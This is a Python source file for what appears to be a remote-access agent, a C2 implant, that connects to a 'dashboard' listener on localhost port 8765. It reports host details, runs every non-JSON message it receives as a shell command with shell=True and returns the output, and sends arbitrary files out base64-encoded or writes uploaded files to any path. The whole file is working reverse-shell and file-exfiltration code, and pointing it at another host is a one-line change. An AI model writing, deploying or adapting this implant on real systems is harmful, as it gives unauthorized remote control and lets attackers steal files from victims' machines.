import socket
import threading
import subprocess
import random
import string
import base64
import os
import sys
import json
import platform
import time

HOST = '127.0.0.1'  # Dashboard host
PORT = 8765         # Dashboard port (to be matched with dashboard)

# Simple protocol: connect, send agent_id, then wait for commands

def handle_server(sock):
    agent_info = {
        'agent_id': agent_id,
        'hostname': platform.node(),
        'os': platform.system(),
        'platform': platform.platform(),
        'cwd': os.getcwd(),
        'start_time': time.time(),
        'pid': os.getpid(),  # Add process ID
        'action': 'agent_info',
    }
    # Send agent info on connect
    sock.sendall(json.dumps(agent_info).encode())
    while True:
        data = sock.recv(4096)
        if not data:
            break
        # Try to parse as JSON for file upload/download
        try:
            decoded = data.decode(errors='replace')
            print(f"[AGENT] Decoded data: {decoded}")  # DEBUG
            msg = json.loads(decoded)
            print(f"[AGENT] Parsed JSON: {msg}")  # DEBUG
            if msg.get('action') == 'download':
                filepath = msg.get('filepath')
                print(f"[AGENT] Download request for: {filepath}")
                print(f"[AGENT] Current working directory: {os.getcwd()}")
                print(f"[AGENT] File exists: {os.path.isfile(filepath)}")
                print(f"[AGENT] Raw msg: {msg}")
                if filepath is not None and filepath != '' and os.path.isfile(filepath):
                    with open(filepath, 'rb') as f:
                        filedata = f.read()
                    payload = json.dumps({
                        'filedata': base64.b64encode(filedata).decode(),
                        'filename': os.path.basename(filepath),
                        'action': 'download',
                    })
                    sock.sendall(payload.encode())
                else:
                    err = json.dumps({'output': f'File not found: {filepath}'})
                    sock.sendall(err.encode())
                continue
            elif msg.get('action') == 'upload':
                filepath = msg.get('filepath')
                filedata = msg.get('filedata')
                if filepath and filedata:
                    with open(filepath, 'wb') as f:
                        f.write(base64.b64decode(filedata))
                    ack = json.dumps({'output': f'File uploaded: {filepath}'})
                    sock.sendall(ack.encode())
                continue
        except Exception as e:
            print(f"[AGENT] Exception: {e}")
            print(f"[AGENT] Raw data: {data}")
            pass
        # If not JSON, treat as a command
        command = data.decode(errors='replace')
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=10)
            sock.sendall(result)
        except Exception as e:
            sock.sendall(str(e).encode())

def generate_agent_id():
    return 'agent-' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))

def main():
    global agent_id
    # Priority for agent ID:
    # 1. Command line argument
    # 2. Generate a new ID
    if len(sys.argv) > 1:
        agent_id = sys.argv[1]
        print(f"Agent starting with provided ID: {agent_id}")
    else:
        agent_id = generate_agent_id()
        print(f"Agent starting with generated ID: {agent_id}")
    # No longer save or load .id files
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(agent_id.encode())
        handle_server(s)

if __name__ == '__main__':
    main()
